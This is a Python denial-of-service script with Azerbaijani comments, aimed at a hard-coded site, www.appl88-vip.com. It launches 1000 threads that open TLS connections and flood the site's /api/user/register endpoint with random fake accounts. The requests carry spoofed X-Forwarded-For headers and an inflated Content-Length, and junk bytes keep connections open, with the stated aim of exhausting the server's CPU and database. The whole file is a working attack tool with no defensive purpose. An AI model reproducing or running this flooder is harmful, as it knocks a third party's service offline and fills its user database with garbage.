import socket
import ssl
import threading
import random
import string
import time

# --- EXTREME TARGET ---
TARGET_HOST = "www.appl88-vip.com"
TARGET_PORT = 443
# Railway Paid üçün bu rəqəmi 1000-ə qaldırırıq
THREADS = 1000 

def r_str(n):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def attack():
    # SSL tənzimləmələrini serveri "təhlillə" yormaq üçün edirik
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    # Şifrələməni ən ağır səviyyəyə qoyuruq (Server CPU-su üçün mürəkkəb olsun)
    ctx.set_ciphers('DEFAULT@SECLEVEL=1')

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(5)

            conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
            conn.connect((TARGET_HOST, TARGET_PORT))

            # Bu hissə saytın qeydiyyat API-ni (register) hədəf alır
            # Server hər sorğu üçün daxildə yeni bir prosess (fork) açmalı olur
            for _ in range(100):
                fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                
                # Ağır Payload: Qeydiyyat bazasını yoran POST datası
                payload = (
                    f"POST /api/user/register HTTP/1.1\r\n" # Bura ən kritik nöqtədir
                    f"Host: {TARGET_HOST}\r\n"
                    f"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15\r\n"
                    f"Content-Type: application/json\r\n"
                    f"X-Forwarded-For: {fake_ip}\r\n"
                    f"X-Requested-With: XMLHttpRequest\r\n"
                    f"Content-Length: 10000\r\n" # Serveri 10 KB məlumat gözləməyə məcbur edirik
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                    f"{'{\"username\":\"' + r_str(20) + '\",\"password\":\"' + r_str(30) + '\",\"invite_code\":\"123456\"}'}"
                ).encode()

                conn.sendall(payload)
                # Serverin bağlantını bağlamaması üçün aralarda "zibil" baytlar göndər
                conn.send(b"\x00")
                
            time.sleep(1)
            conn.close()
        except:
            pass

def main():
    print(f"💀 THE VOID INITIALIZED: {TARGET_HOST}")
    print("[!] Targeting Registration API and Database Persistence...")
    
    for i in range(THREADS):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()
        if i % 100 == 0:
            print(f"[*] {i} API Flooders Deployed...")
            time.sleep(0.5)

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
